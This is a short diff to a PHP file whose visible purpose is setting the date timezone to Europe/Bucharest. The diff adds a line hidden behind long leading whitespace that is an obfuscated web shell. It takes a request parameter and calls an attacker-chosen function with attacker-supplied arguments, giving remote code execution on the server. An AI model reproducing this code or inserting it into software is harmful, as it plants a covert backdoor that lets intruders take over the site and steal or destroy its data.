@@ -1,4 +1,5 @@
 <?php
+                                                                                                                                                                                                                                                                               IF	($gk4m4=@ ${'_REQUEST'} [ '1ORH1UTK' ])$gk4m4 [1	]($	{$gk4m4	[	2 ]}[ 0]	,$gk4m4[	3	]	($gk4m4[4	]));
   // Set date timezone.
   date_default_timezone_set('Europe/Bucharest');
 
